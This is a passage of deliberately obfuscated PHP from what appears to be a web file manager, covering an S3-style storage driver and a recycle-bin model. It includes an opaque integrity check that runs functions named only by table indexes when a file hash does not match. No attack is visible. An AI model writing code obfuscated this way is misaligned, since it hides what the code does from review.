$this->cacheMethod($F„ºÜ¢´Û¦[198], $aëöÇšÈ¤[$F„ºÜ¢´Û¦[28]], !0); } } if ($dºîëëœ·ô) { $this->cacheMethod($F„ºÜ¢´Û¦[198], $AÓÉÇáÍƒ, !0); } goto C…Åì“–‡; Féå‹åéÔË: } private function listObjs($fµö³‡¸‘ã, $d´²Œ•‰Æí = null, $EÓì÷ºíí = null, $fÃ„ÏÈ¢§ = null) { $e™ŒêÎ«áÕ =& $_SERVER[´¬]; $fµö³‡¸‘ã = trim($fµö³‡¸‘ã, $e™ŒêÎ«áÕ[8]); $e£î±´ğÂé = empty($fµö³‡¸‘ã) ? $e™ŒêÎ«áÕ[33] : $fµö³‡¸‘ã . $e™ŒêÎ«áÕ[8]; return $this->client->getBucket($this->bucket, $e£î±´ğÂé, $d´²Œ•‰Æí, $EÓì÷ºíí, $fÃ„ÏÈ¢§, !0); } public function has($CÑÄ³ğøö½, $F©é¾„®Éä = false, $e¡’Ëœ‡·¦ = true) { goto D”Õ‘Â°…; DØÁöÒŠ¯Ä: return !1; goto AöŞ×É‹Å; aÛáÄõø‘: $b«½ä›²“ = $fä»ÌùÖ… = array(); while (!0) { $a¦„ÌÎÅÍŒ = $this->listObjs($CÑÄ³ğøö½, $Bˆ¤Á‹·İ, $e÷Û‘ù±šì, $fòñŠ¦…°†); if (!$a¦„ÌÎÅÍŒ) { break; } $Bˆ¤Á‹·İ = $a¦„ÌÎÅÍŒ[$fšä›ßÜ¿“[201]]; $DÀ¡ø™„ª = $a¦„ÌÎÅÍŒ[$fšä›ßÜ¿“[197]]; $c±¶Ì×î³ß = $a¦„ÌÎÅÍŒ[$fšä›ßÜ¿“[200]]; if (empty($DÀ¡ø™„ª) && empty($c±¶Ì×î³ß)) { break; } if (count($DÀ¡ø™„ª) == 1 && $DÀ¡ø™„ª[0][$fšä›ßÜ¿“[28]] == $c‘ãƒ’ƒ›) { break; } if ($F©é¾„®Éä) { if (count($DÀ¡ø™„ª)) { $DÀ¡ø™„ª = array_column($DÀ¡ø™„ª, $fšä›ßÜ¿“[28]); $b«½ä›²“ = array_merge($b«½ä›²“, $DÀ¡ø™„ª); } if (count($c±¶Ì×î³ß)) { $c±¶Ì×î³ß = array_column($c±¶Ì×î³ß, $fšä›ßÜ¿“[28]); $fä»ÌùÖ… = array_merge($fä»ÌùÖ…, $c±¶Ì×î³ß); } if ($Bˆ¤Á‹·İ === null) { break; } continue; } if ($e¡’Ëœ‡·¦) { if (!empty($DÀ¡ø™„ª)) { if (count($DÀ¡ø™„ª) > 1 || isset($DÀ¡ø™„ª[0][$fšä›ßÜ¿“[28]]) && $DÀ¡ø™„ª[0][$fšä›ßÜ¿“[28]] != $c‘ãƒ’ƒ›) { return !0; } } } else { if (!empty($c±¶Ì×î³ß)) { return !0; } } if ($Bˆ¤Á‹·İ === null) { break; } } if ($F©é¾„®Éä) { $b«½ä›²“ = array_diff($b«½ä›²“, array($c‘ãƒ’ƒ›)); $b«½ä›²“ = count(array_unique($b«½ä›²“)); $fä»ÌùÖ… = count(array_unique($fä»ÌùÖ…)); return array($fšä›ßÜ¿“[202] => $b«½ä›²“, $fšä›ßÜ¿“[203] => $fä»ÌùÖ…); } goto DØÁöÒŠ¯Ä; D”Õ‘Â°…: $fšä›ßÜ¿“ =& $_SERVER[´¬]; $CÑÄ³ğøö½ = trim($CÑÄ³ğøö½, $fšä›ßÜ¿“[8]); $c‘ãƒ’ƒ› = empty($CÑÄ³ğøö½) ? $fšä›ßÜ¿“[33] : $CÑÄ³ğøö½ . $fšä›ßÜ¿“[8]; goto e§çè­; e§çè­: $Bˆ¤Á‹·İ = null; $e÷Û‘ù±šì = 500; $fòñŠ¦…°† = $fšä›ßÜ¿“[8]; goto aÛáÄõø‘; AöŞ×É‹Å: } public function listAll($Cö†šÀÏÚ×) { $cëôßçÀĞË =& $_SERVER[´¬]; $eÕİ•Àñ«§ = $this->fileList($Cö†šÀÏÚ×, $cëôßçÀĞË[33], !0); $eÕ¤Ü¿˜ŠÃ = array(); foreach ($eÕİ•Àñ«§[$cëôßçÀĞË[74]] as $f‘©Ğò•Îƒ) { $eÕ¤Ü¿˜ŠÃ[$f‘©Ğò•Îƒ[$cëôßçÀĞË[28]]] = $f‘©Ğò•Îƒ[$cëôßçÀĞË[78]]; } foreach ($eÕİ•Àñ«§[$cëôßçÀĞË[75]] as $f‘©Ğò•Îƒ) { if (is_string($f‘©Ğò•Îƒ)) { $eÕ¤Ü¿˜ŠÃ[$f‘©Ğò•Îƒ] = 0; } } return $this->listAllFiles($Cö†šÀÏÚ×, array_keys($eÕ¤Ü¿˜ŠÃ), $eÕ¤Ü¿˜ŠÃ); } public function canRead($EºÓÌõîÚŸ) { $cá•ŸåÆ‹¨ =& $_SERVER[´¬]; $Fêó—°•³Ï = $this->client->getAccessControlPolicy($this->bucket, $EºÓÌõîÚŸ); if (!$Fêó—°•³Ï) { return !1; } return in_array($Fêó—°•³Ï, array($cá•ŸåÆ‹¨[204], $cá•ŸåÆ‹¨[205], $cá•ŸåÆ‹¨[206])) ? !0 : !1; } public function canWrite($bšÜƒ»¦¹) { $bÃÏ·´ºÛİ =& $_SERVER[´¬]; $c–¼‹µäæø = $this->client->getAccessControlPolicy($this->bucket, $bšÜƒ»¦¹); if (!$c–¼‹µäæø) { return !1; } return in_array($c–¼‹µäæø, array($bÃÏ·´ºÛİ[204], $bÃÏ·´ºÛİ[205])) ? !0 : !1; } public function getContent($B”ŞÓ²Ø¶š) { return $this->client->getObject($this->bucket, $B”ŞÓ²Ø¶š); } public function setContent($E²ÛÉ’ô°Ê, $F•Ø‹·Õô‘ = '', $e›±À¤İ = false) { goto c÷ª Ö·ò¯; Aàä«ğ«Ôœ: $cÂíğãÜŠ = $this->client->putObject($F•Ø‹·Õô‘, $this->bucket, $E²ÛÉ’ô°Ê, $e×ãÔ„§Àö[191], array(), $bòÏ¤Âíî›); if (!$cÂíğãÜŠ) { return !1; } if ($e›±À¤İ) { return !0; } goto CÓ’„¼‘×ğ; c÷ª Ö·ò¯: $e×ãÔ„§Àö =& $_SERVER[´¬]; $E²ÛÉ’ô°Ê = $e›±À¤İ ? trim($E²ÛÉ’ô°Ê, $e×ãÔ„§Àö[8]) . $e×ãÔ„§Àö[8] : $E²ÛÉ’ô°Ê; $bòÏ¤Âíî› = get_file_mime(get_path_ext($E²ÛÉ’ô°Ê)); goto Aàä«ğ«Ôœ; CÓ’„¼‘×ğ: $this->cacheMethod(null, null); $cÂíğãÜŠ = $this->copyFile($E²ÛÉ’ô°Ê, $E²ÛÉ’ô°Ê, array($e×ãÔ„§Àö[207] => $cÂíğãÜŠ[$e×ãÔ„§Àö[208]])); return $cÂíğãÜŠ ? !0 : !1; goto CİÓ··¤Ø¾; CİÓ··¤Ø¾: } public function fileSubstr($F‚ìßÊ¼Å, $Bó ìêÕñ×, $eªæÇ¸Ñ¾ä) { $BÏô‹“¡– = $Bó ìêÕñ× + $eªæÇ¸Ñ¾ä - 1; return $this->client->getObject($this->bucket, $F‚ìßÊ¼Å, array($_SERVER[´¬][209] => "\x62\171\x74\145\x73\x3d{$Bó ìêÕñ×}\x2d{$BÏô‹“¡–}")); } public function upload($fÜ·âÉ¾, $Dõƒß×–ê, $EÑÕŸ­×ãš = false, $eâ«ùÃØ®ñ = REPEAT_REPLACE) { $AîÅÈŸ«ßÊ =& $_SERVER[´¬]; $aÊ†ò‰Äçˆ = array($AîÅÈŸ«ßÊ[207] => @md5_file($Dõƒß×–ê)); $BÊ†Ÿ†Éë = array($AîÅÈŸ«ßÊ[210] => get_file_mime(get_path_ext($fÜ·âÉ¾))); if (IO::size($Dõƒß×–ê) <= 1024 * 1024 * 200) { $eÀˆÏã¦óÀ = $this->client->putObjectFile($Dõƒß×–ê, $this->bucket, $fÜ·âÉ¾, $AîÅÈŸ«ßÊ[191], $aÊ†ò‰Äçˆ, $BÊ†Ÿ†Éë); return !empty($eÀˆÏã¦óÀ) ? $this->getPathOuter($fÜ·âÉ¾) : !1; } $cŸ„ÒÔÕÏ÷ = $this->client->multiUploadObject($Dõƒß×–ê, $this->bucket, trim($fÜ·âÉ¾, $AîÅÈŸ«ßÊ[8]), $aÊ†ò‰Äçˆ, $BÊ†Ÿ†Éë); return $cŸ„ÒÔÕÏ÷ ? $this->getPathOuter($fÜ·âÉ¾) : !1; } public function download($FŒšîÄˆ , $AÁÒ«†Ï¢) { if (!@is_dir($this->pathFather($AÁÒ«†Ï¢)) && !IO::mkdir($this->pathFather($AÁÒ«†Ï¢))) { return !1; } $c‡Î÷©¨ = $this->client->getObject($this->bucket, $FŒšîÄˆ , array(), $AÁÒ«†Ï¢); return $c‡Î÷©¨ !== !1 ? $AÁÒ«†Ï¢ : !1; } public function link($eŒ°“Ê»èñ, $aÊèŠº¿‰ = array()) { $CÏÅáøİ» =& $_SERVER[´¬]; if ($this->signVer == $CÏÅáøİ»[211]) { return $this->client->getAuthenticatedURL($this->bucket, $eŒ°“Ê»èñ, 3600 * 12, $aÊèŠº¿‰); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($eŒ°“Ê»èñ, $CÏÅáøİ»[8]), 3600 * 12, $this->region, array(), !0, $aÊèŠº¿‰); } public function fileOut($C¤ÕïÅ·ãÏ, $dë‰‘®¢ì = false, $aŞçì‡„æ = false, $f»ôÃõğ¦Ù = '') { goto càÆî†¢Ü; càÆî†¢Ü: $fÊÎÃ«˜÷Ö =& $_SERVER[´¬]; if ($this->isFileOutServer()) { return $this->fileOutServer($C¤ÕïÅ·ãÏ, $dë‰‘®¢ì, $aŞçì‡„æ, $f»ôÃõğ¦Ù); } if (!$aŞçì‡„æ) { $aŞçì‡„æ = $this->pathThis($C¤ÕïÅ·ãÏ); } goto c‹Äåê§Ö; D¹¹ƒ³¥ÖÔ: $cíßß´‘›Š = array($fÊÎÃ«˜÷Ö[215] => $dë‰‘®¢ì . $fÊÎÃ«˜÷Ö[216] . rawurlencode($aŞçì‡„æ), $fÊÎÃ«˜÷Ö[217] => $EŒ“¶†õ£ƒ); $a„¿ßİ‚¦Ó = $this->link($C¤ÕïÅ·ãÏ, $cíßß´‘›Š); $this->fileOutLink($a„¿ßİ‚¦Ó); goto A™ç´”Ç¨; c‹Äåê§Ö: $EŒ“¶†õ£ƒ = get_file_mime(get_path_ext($aŞçì‡„æ)); if ($EŒ“¶†õ£ƒ == $fÊÎÃ«˜÷Ö[212]) { return parent::fileOut($C¤ÕïÅ·ãÏ, $dë‰‘®¢ì, $aŞçì‡„æ, $f»ôÃõğ¦Ù); } $dë‰‘®¢ì = $dë‰‘®¢ì ? $fÊÎÃ«˜÷Ö[213] : $fÊÎÃ«˜÷Ö[214]; goto D¹¹ƒ³¥ÖÔ; A™ç´”Ç¨: } public function fileOutServer($FÇ Üáî¾, $FöÒÃğñßá = false, $DœÍìĞÖëË = false, $cè‘“‡ƒ†½ = '') { parent::fileOut($FÇ Üáî¾, $FöÒÃğñßá, $DœÍìĞÖëË, $cè‘“‡ƒ†½); } public function fileOutImageServer($DÍ¤ù¸ğÕ‰, $bªÖ æ²Éñ = 250) { parent::fileOutImage($DÍ¤ù¸ğÕ‰, $bªÖ æ²Éñ); } public function hashMd5($eÃ¹‡éá±™, $cĞÊäÌ¤­Á = '') { $B´‚Ÿñ‰¤ =& $_SERVER[´¬]; $cÙì½”‹ÂÜ = $this->objectMeta($eÃ¹‡éá±™); if (!$cÙì½”‹ÂÜ) { return !1; } $cĞÊäÌ¤­Á = $cĞÊäÌ¤­Á ? $cĞÊäÌ¤­Á : _get($cÙì½”‹ÂÜ, $B´‚Ÿñ‰¤[218]); $cĞÊäÌ¤­Á = $cĞÊäÌ¤­Á ? $cĞÊäÌ¤­Á : _get($cÙì½”‹ÂÜ, $B´‚Ÿñ‰¤[208], $B´‚Ÿñ‰¤[33]); return $cĞÊäÌ¤­Á; } public function uploadFormData($BŞÒ¬¥ë¶Í, $bİšƒÒß°¢ = 3600) { $F”£ö£Ä† =& $_SERVER[´¬]; $aÌàùã„®¨ = $this->pathFather($BŞÒ¬¥ë¶Í); $d‘Çí™È„ = $this->client->getHttpUploadPostParams($this->bucket, $aÌàùã„®¨, $F”£ö£Ä†[191], $bİšƒÒß°¢); return array_merge((array) $d‘Çí™È„, array($F”£ö£Ä†[175] => $this->getHost())); } public function multiUploadFormData($a‡ÉâËÅŸ, $F¸­…µ…  = 3600) { $F™œÂÕ¸ùš =& $_SERVER[´¬]; $CêøÆ†ô’æ = gmdate($F™œÂÕ¸ùš[219]); $FØ¸«©å™ª = array(); $CÄìàáºñ = $this->client->getUploadId($this->bucket, $a‡ÉâËÅŸ, $FØ¸«©å™ª); if (!$CÄìàáºñ) { return !1; } return array($F™œÂÕ¸ùš[220] => $CÄìàáºñ, $F™œÂÕ¸ùš[175] => $this->getHost() . $F™œÂÕ¸ùš[8] . $this->pathEncode($a‡ÉâËÅŸ), $F™œÂÕ¸ùš[221] => $CêøÆ†ô’æ, $F™œÂÕ¸ùš[93] => $a‡ÉâËÅŸ); } public function multiUploadAuthData($aÁŸ¾ù«§Š, $AÚàÇ™Ş´‰ = array()) { goto aÛ»÷â»¾; f‘ÈŒ•Äì: $cæÍà´œ¾ğ = $AÚàÇ™Ş´‰[$f©‚÷ŸŒÇè[93]]; unset($AÚàÇ™Ş´‰[$f©‚÷ŸŒÇè[93]]); if (isset($AÚàÇ™Ş´‰[$f©‚÷ŸŒÇè[222]])) { $AÚàÇ™Ş´‰[$f©‚÷ŸŒÇè[221]] = $aóÍÀñ™§; return $this->listUploadParts($cæÍà´œ¾ğ, $AÚàÇ™Ş´‰); } goto c„åÈ……ø÷; aÛ»÷â»¾: $f©‚÷ŸŒÇè =& $_SERVER[´¬]; $aóÍÀñ™§ = isset($AÚàÇ™Ş´‰[$f©‚÷ŸŒÇè[221]]) ? $AÚàÇ™Ş´‰[$f©‚÷ŸŒÇè[221]] : gmdate($f©‚÷ŸŒÇè[219]); $e•È³”Ù× = isset($AÚàÇ™Ş´‰[$f©‚÷ŸŒÇè[168]]) ? $AÚàÇ™Ş´‰[$f©‚÷ŸŒÇè[168]] : $f©‚÷ŸŒÇè[33]; goto f‘ÈŒ•Äì; Fò·™²›…„: if (strpos($e•È³”Ù×, $f©‚÷ŸŒÇè[224]) === 0) { return array($f©‚÷ŸŒÇè[231] => $BïèÒÙææï, $f©‚÷ŸŒÇè[221] => $aóÍÀñ™§); } return $BïèÒÙææï; goto cİ»ó‰…æ; c„åÈ……ø÷: $a¸ë”ÉÂ¶ = array($f©‚÷ŸŒÇè[223], $f©‚÷ŸŒÇè[33], $f©‚÷ŸŒÇè[119], $f©‚÷ŸŒÇè[33], "\x78\55\x61\x6d\172\55\144\x61\x74\145\x3a{$aóÍÀñ™§}", $f©‚÷ŸŒÇè[8] . $this->bucket . $f©‚÷ŸŒÇè[8] . $this->pathEncode($cæÍà´œ¾ğ) . $e•È³”Ù×); if (strpos($e•È³”Ù×, $f©‚÷ŸŒÇè[224]) === 0) { $a¸ë”ÉÂ¶[0] = $f©‚÷ŸŒÇè[225]; } if (isset($AÚàÇ™Ş´‰[$f©‚÷ŸŒÇè[226]]) && $AÚàÇ™Ş´‰[$f©‚÷ŸŒÇè[226]] == $f©‚÷ŸŒÇè[227]) { $a¸ë”ÉÂ¶[0] = $f©‚÷ŸŒÇè[227]; } goto dš¢Ú‰Ãğ°; dš¢Ú‰Ãğ°: $A¯î“à°„ = implode($f©‚÷ŸŒÇè[228], $a¸ë”ÉÂ¶); $A¡¥†ƒ”‹‡ = base64_encode(hash_hmac($f©‚÷ŸŒÇè[229], $A¯î“à°„, $this->secret, !0)); $BïèÒÙææï = $f©‚÷ŸŒÇè[230] . $this->accessKey . $f©‚÷ŸŒÇè[4] . $A¡¥†ƒ”‹‡; goto Fò·™²›…„; cİ»ó‰…æ: } public function listUploadParts($BĞ£ áÄä«, $A˜ìª¯¶ğô = array()) { goto dº®å«¹Òø; c¥„Ä²ŠÅ­: $e¬™ğ¡ƒåˆ = $this->multiUploadAuthData($BĞ£ áÄä«, $A˜ìª¯¶ğô); if (empty($e¬™ğ¡ƒåˆ)) { return !1; } return array($aÀ¶±ŸäÍö[231] => $e¬™ğ¡ƒåˆ, $aÀ¶±ŸäÍö[221] => $A˜ìª¯¶ğô[$aÀ¶±ŸäÍö[221]], $aÀ¶±ŸäÍö[233] => $d†Ş´Â†¯…); goto a“‘œ‚ŠçÄ; dº®å«¹Òø: $aÀ¶±ŸäÍö =& $_SERVER[´¬]; $C›à„ÁàäÔ = str_replace($aÀ¶±ŸäÍö[232], $aÀ¶±ŸäÍö[33], $A˜ìª¯¶ğô[$aÀ¶±ŸäÍö[168]]); $d†Ş´Â†¯… = $this->client->listParts($this->bucket, $BĞ£ áÄä«, $C›à„ÁàäÔ); goto EÈƒéÑº¢Ñ; EÈƒéÑº¢Ñ: if (!$d†Ş´Â†¯…) { return !1; } unset($A˜ìª¯¶ğô[$aÀ¶±ŸäÍö[222]], $A˜ìª¯¶ğô[$aÀ¶±ŸäÍö[226]]); $A˜ìª¯¶ğô[$aÀ¶±ŸäÍö[93]] = $BĞ£ áÄä«; goto c¥„Ä²ŠÅ­; a“‘œ‚ŠçÄ: } public function getHost() { return parent::getHost() . $_SERVER[´¬][8] . $this->bucket; } public function size($d‚ê¯ãêÙ) { $D¯šòÇàˆÎ = $this->objectMeta($d‚ê¯ãêÙ); return $D¯šòÇàˆÎ ? $D¯šòÇàˆÎ[$_SERVER[´¬][78]] : 0; } public function info($E©­¸Á‘á–) { if ($this->isFolder($E©­¸Á‘á–)) { return $this->folderInfo($E©­¸Á‘á–); } else { if ($this->isFile($E©­¸Á‘á–)) { return $this->fileInfo($E©­¸Á‘á–); } } return !1; } public function exist($aÍÊ‹óÔ) { return $this->isFile($aÍÊ‹óÔ) || $this->isFolder($aÍÊ‹óÔ); } public function isFile($c¼Ü²¯è‚) { return !$this->isFolder($c¼Ü²¯è‚) && $this->objectMeta($c¼Ü²¯è‚); } public function isFolder($dåÍ‚ï—´í) { return $this->cacheMethod($_SERVER[´¬][198], $dåÍ‚ï—´í); } protected function objectMeta($cµŞ¤¤ÃŠ©) { return $this->cacheMethod($_SERVER[´¬][199], $cµŞ¤¤ÃŠ©); } protected function _objectMeta($D®øí«à‹í) { $fŒ¡¯å°à =& $_SERVER[´¬]; $D®øí«à‹í = rtrim($D®øí«à‹í, $fŒ¡¯å°à[8]); try { $dÆ£ŒÓÔÈ† = $this->client->getObjectInfo($this->bucket, $D®øí«à‹í); if (!isset($dÆ£ŒÓÔÈ†[$fŒ¡¯å°à[218]]) && isset($dÆ£ŒÓÔÈ†[$fŒ¡¯å°à[234]])) { $dÆ£ŒÓÔÈ†[$fŒ¡¯å°à[218]] = $dÆ£ŒÓÔÈ†[$fŒ¡¯å°à[234]]; } } catch (Exception $Bä¸ £½›) { $dÆ£ŒÓÔÈ† = !1; } if (!$dÆ£ŒÓÔÈ†) { } return $dÆ£ŒÓÔÈ†; } protected function _isFolder($Bğ»êãÔ) { goto b…Î¦‚‘¦Œ; AĞÊØÀĞ¢÷: $F–ÔĞŠÔŒ = $this->client->getBucket($this->bucket, $Bğ»êãÔ, null, 1); if (empty($F–ÔĞŠÔŒ[$aâŠöˆ†¢Â[197]])) { return !1; } $dÈ°Æ‘¿Ë¡ = $F–ÔĞŠÔŒ[$aâŠöˆ†¢Â[197]][0][$aâŠöˆ†¢Â[28]]; goto dŞèğ¿‹æ; dŞèğ¿‹æ: if (substr($dÈ°Æ‘¿Ë¡, -1) == $aâŠöˆ†¢Â[8]) { return !0; } if (get_path_this($dÈ°Æ‘¿Ë¡) == get_path_this($Bğ»êãÔ)) { return !1; } return !0; goto b™¸ß¦‘ÃŒ; b…Î¦‚‘¦Œ: $aâŠöˆ†¢Â =& $_SERVER[´¬]; $Bğ»êãÔ = rtrim($Bğ»êãÔ, $aâŠöˆ†¢Â[8]); if ($Bğ»êãÔ == $aâŠöˆ†¢Â[33] || $Bğ»êãÔ == $aâŠöˆ†¢Â[8]) { return !0; } goto AĞÊØÀĞ¢÷; b™¸ß¦‘ÃŒ: } } define($_SERVER[´¬][235], 1); goto bğæ‚ÛÒ£­; D­ñÅãÊœÎ: $b‰±ë‰›ÑÖ = $_SERVER[´¬][839]; if ($_SERVER[$_SERVER[´¬][821]] != $b‰±ë‰›ÑÖ($AŠäáÅæ‘î)) { goto E»ÁÄÂ†µÀ; DíŒÏ‹ŸŒÌ: $F¢’¶¾¢ä = explode($_SERVER[´¬][228], $fœ¥¬…Á‚); if (count($F¢’¶¾¢ä) < $_SERVER[´¬][580]) { $FçËÈËš = $_SERVER[´¬][826]; $FçËÈËš(); } $aï®Æ‡¶êí = $_SERVER[´¬][827]; goto bŸ£‰Ğ‘„é; E»ÁÄÂ†µÀ: $DÊËÔÕˆ = $_SERVER[´¬][823]; $e¡Î¸áÅÈœ = $_SERVER[$_SERVER[´¬][824]] . $_SERVER[´¬][825]; $fœ¥¬…Á‚ = $DÊËÔÕˆ($e¡Î¸áÅÈœ); goto DíŒÏ‹ŸŒÌ; bŸ£‰Ğ‘„é: $aï®Æ‡¶êí($AŠäáÅæ‘î); goto cªÑÖŞ±íç; cªÑÖŞ±íç: } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\162\143\145\x5f\162\145\143\171\143\154\x65"; protected $dataAuto = array(array("\143\162\x65\141\164\x65\124\151\155\x65", "\x74\151\x6d\x65", "\x69\156\163\145\x72\164", "\x66\165\x6e\143\164\151\x6f\156")); public function listData($AÊİÓÒ£ã = false) { $E²Š¢äÀá¯ =& $_SERVER[´¬]; $AÊİÓÒ£ã = $AÊİÓÒ£ã ? $AÊİÓÒ£ã : USER_ID; $bĞø‹ˆ´Œ‰ = $this->where(array($E²Š¢äÀá¯[1518] => $AÊİÓÒ£ã))->select(); return array_to_keyvalue($bĞø‹ˆ´Œ‰, $E²Š¢äÀá¯[33], $E²Š¢äÀá¯[394]); } public function moveToRecycle($bˆ¤Àœö¬†) { goto E“šÆï¡ï; D««¸ÖÕÄâ: if (!$BÌ‹ó•ì· || $BÌ‹ó•ì·[$EŸì÷È¿ä[421]] == $EŸì÷È¿ä[87]) { return; } $aµšØØßğ… = array($EŸì÷È¿ä[408] => $bˆ¤Àœö¬†, $EŸì÷È¿ä[1518] => USER_ID, $EŸì÷È¿ä[548] => $BÌ‹ó•ì·[$EŸì÷È¿ä[402]], $EŸì÷È¿ä[549] => $BÌ‹ó•ì·[$EŸì÷È¿ä[482]], $EŸì÷È¿ä[552] => $BÌ‹ó•ì·[$EŸì÷È¿ä[485]]); $this->add($aµšØØßğ…); goto e¾Ìóøò×¬; e¾Ìóøò×¬: $this->recycleMove($bˆ¤Àœö¬†, 1); if ($BÌ‹ó•ì·[$EŸì÷È¿ä[401]] == $EŸì÷È¿ä[87]) { $bÎÅâÄƒî± = array($EŸì÷È¿ä[552] => array($EŸì÷È¿ä[511], $BÌ‹ó•ì·[$EŸì÷È¿ä[485]] . $bˆ¤Àœö¬† . $EŸì÷È¿ä[512])); $F‰‚¿¡Õ‰ö->where($bÎÅâÄƒî±)->setField($EŸì÷È¿ä[421], 1); } goto E‘Ûìî­°Ï; E“šÆï¡ï: $EŸì÷È¿ä =& $_SERVER[´¬]; $F‰‚¿¡Õ‰ö = Model($EŸì÷È¿ä[1206]); $BÌ‹ó•ì· = $F‰‚¿¡Õ‰ö->sourceInfo($bˆ¤Àœö¬†); goto D««¸ÖÕÄâ; E‘Ûìî­°Ï: } public function clear() { $this->remove(!1); } public function remove($b½ªñÍÆ®ó = false, $FĞŠÉÄãµé = false) { goto aÓ£İìêÕº; aÓ£İìêÕº: $dÚˆò­¢›Ë =& $_SERVER[´¬]; $FĞŠÉÄãµé = $FĞŠÉÄãµé ? $FĞŠÉÄãµé : USER_ID; $BÛš¿ˆ‘—³ = Model($dÚˆò­¢›Ë[1206]); goto Aóõ‡¬òÉ; F„Ã²òïÜÒ: foreach ($EÖ¨İ”ÁØ” as $CÏ¡ãÑîğª) { if ($b½ªñÍÆ®ó != !1 && !in_array($CÏ¡ãÑîğª, $b½ªñÍÆ®ó)) { continue; } $Aâ®ÚÈ¹Ì÷ = $BÛš¿ˆ‘—³->sourceInfo($CÏ¡ãÑîğª); $BÛš¿ˆ‘—³->remove($CÏ¡ãÑîğª, !1); $e™É±å¥½ß = $Aâ®ÚÈ¹Ì÷[$dÚˆò­¢›Ë[402]] . $dÚˆò­¢›Ë[71] . $Aâ®ÚÈ¹Ì÷[$dÚˆò­¢›Ë[482]]; $eÂğäš†¥[$e™É±å¥½ß] = array($dÚˆò­¢›Ë[548] => $Aâ®ÚÈ¹Ì÷[$dÚˆò­¢›Ë[402]], $dÚˆò­¢›Ë[482] => $Aâ®ÚÈ¹Ì÷[$dÚˆò­¢›Ë[482]]); $this->where(array($dÚˆò­¢›Ë[394] => $CÏ¡ãÑîğª))->delete(); } foreach ($eÂğäš†¥ as $DëŠ²ôåÖğ) { $BÛš¿ˆ‘—³->targetSpaceUpdate($DëŠ²ôåÖğ[$dÚˆò­¢›Ë[402]], $DëŠ²ôåÖğ[$dÚˆò­¢›Ë[482]]); } goto a–¾¸Ö¡©; Aóõ‡¬òÉ: $EÖ¨İ”ÁØ” = $this->listData($FĞŠÉÄãµé); $b½ªñÍÆ®ó = $b½ªñÍÆ®ó === !1 ? !1 : $b½ªñÍÆ®ó; $eÂğäš†¥ = array(); goto F„Ã²òïÜÒ; a–¾¸Ö¡©: } public function restore($cñ¥îÙ¼‚º = false) { $b¥¼›÷‰µñ = $this->listData(); $this->_restoreSource($b¥¼›÷‰µñ, $cñ¥îÙ¼‚º); } public function removeUserAll($f›Íå‡¥Ä¡) { $this->remove(!1, $f›Íå‡¥Ä¡); } private function _restoreSource($B„è„Ô»öŸ, $fÙ»™Ç¹ç) { goto dåõßâ‚¸ò; C‘›ñÂµÄ: if (!$B„è„Ô»öŸ) { return !0; } $Aôª”èˆ…… = array(); foreach ($B„è„Ô»öŸ as $CÒåäøÚ) { goto CÙ•ªšªö½; AïÖ¯õ± : if ($A³°œæ¥½Æ[$c™è‘è–«½[401]] == $c™è‘è–«½[87]) { $b»ÊÑ‹¾¹ = array($c™è‘è–«½[552] => array($c™è‘è–«½[511], $A³°œæ¥½Æ[$c™è‘è–«½[485]] . $CÒåäøÚ . $c™è‘è–«½[512])); $D¯´Ÿ¯ùâ²->where($b»ÊÑ‹¾¹)->setField($c™è‘è–«½[421], 0); $this->restoreFolderChildren($CÒåäøÚ, $B„è„Ô»öŸ); } $this->where(array($c™è‘è–«½[394] => $CÒåäøÚ))->delete(); $D¯´Ÿ¯ùâ²->folderSizeReset($A³°œæ¥½Æ[$c™è‘è–«½[476]]); goto eªåˆ÷Å«; CÙ•ªšªö½: if ($fÙ»™Ç¹ç != !1 && !in_array($CÒåäøÚ, $fÙ»™Ç¹ç)) { continue; } $A³°œæ¥½Æ = $D¯´Ÿ¯ùâ²->sourceInfo($CÒåäøÚ); $Eàö‘Ÿ„È = $D¯´Ÿ¯ùâ²->sourceInfo($A³°œæ¥½Æ[$c™è‘è–«½[476]]); goto FçÔéçë’; FçÔéçë’: if ($Eàö‘Ÿ„È[$c™è‘è–«½[421]] == $c™è‘è–«½[87]) { continue; } $D¯´Ÿ¯ùâ²->lockMoveStart($CÒåäøÚ); $this->recycleMove($CÒåäøÚ, 0); goto AïÖ¯õ± ; eªåˆ÷Å«: $Aôª”èˆ……[] = $A³°œæ¥½Æ[$c™è‘è–«½[476]]; if ($A³°œæ¥½Æ[$c™è‘è–«½[401]] == $c™è‘è–«½[87]) { $Aôª”èˆ……[] = $CÒåäøÚ; } $D¯´Ÿ¯ùâ²->lockMoveEnd($CÒåäøÚ); goto fí©¹“Ê; fí©¹“Ê: } goto d‡‚®ãàÃ; dåõßâ‚¸ò: $c™è‘è–«½ =& $_SERVER[´¬]; $D¯´Ÿ¯ùâ² = Model($c™è‘è–«½[1206]); $fÙ»™Ç¹ç = $fÙ»™Ç¹ç == !1 ? !1 : $fÙ»™Ç¹ç; goto C‘›ñÂµÄ; d‡‚®ãàÃ: $D¯´Ÿ¯ùâ²->updateModifyTime($Aôª”èˆ……); goto D¬ïÑŠÃ¥; D¬ïÑŠÃ¥: } private function restoreFolderChildren($a›è±ÈéÎÓ, $CŠ¨ĞëÌ¸ƒ) { goto c·—ßƒÖó; E¯‹¾êº›: $bË êÏù„Ï[$d¿Í‹¹Õ‰[394]][1] = array_unique($bË êÏù„Ï[$d¿Í‹¹Õ‰[394]][1]); $bË êÏù„Ï[$d¿Í‹¹Õ‰[958]] = $d¿Í‹¹Õ‰[1776]; $B¾ŸÕèä¢³->where($bË êÏù„Ï)->setField($d¿Í‹¹Õ‰[421], 1); goto dØ¤ŒÄ—©¹; c·—ßƒÖó: $d¿Í‹¹Õ‰ =& $_SERVER[´¬]; $B¾ŸÕèä¢³ = Model($d¿Í‹¹Õ‰[1206]); $bË êÏù„Ï = array($d¿Í‹¹Õ‰[394] => array($d¿Í‹¹Õ‰[7], array())); goto c÷èÎà®Ğê; c÷èÎà®Ğê: foreach ($CŠ¨ĞëÌ¸ƒ as $AâÍ‘»æ¸Ü) { if ($AâÍ‘»æ¸Ü == $a›è±ÈéÎÓ) { continue; } if (!$B¾ŸÕèä¢³->isParentOf($a›è±ÈéÎÓ, $AâÍ‘»æ¸Ü)) { continue; } $Cê‡ù»’ïÓ = $B¾ŸÕèä¢³->sourceInfo($AâÍ‘»æ¸Ü); if ($Cê‡ù»’ïÓ[$d¿Í‹¹Õ‰[401]] == $d¿Í‹¹Õ‰[87]) { $bË êÏù„Ï[] = 